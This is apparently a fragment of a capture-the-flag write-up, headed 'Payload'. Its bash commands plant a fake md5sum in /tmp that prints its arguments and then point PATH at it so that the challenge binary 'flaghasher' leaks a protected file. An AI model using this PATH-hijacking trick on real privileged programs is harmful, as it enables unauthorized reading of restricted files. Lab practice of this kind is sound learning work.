## Payload
  
```bash
ctf-player@pico-chall$ mkdir -p /tmp/mybin 
ctf-player@pico-chall$ echo '#!/bin/bash' > /tmp/mybin/md5sum 
ctf-player@pico-chall$ echo 'cat "$@" && /usr/bin/md5sum "$@"' >> /tmp/mybin/md5sum 
ctf-player@pico-chall$ chmod +x /tmp/mybin/md5sum 
ctf-player@pico-chall$ PATH=/tmp/mybin:$PATH ./flaghasher
```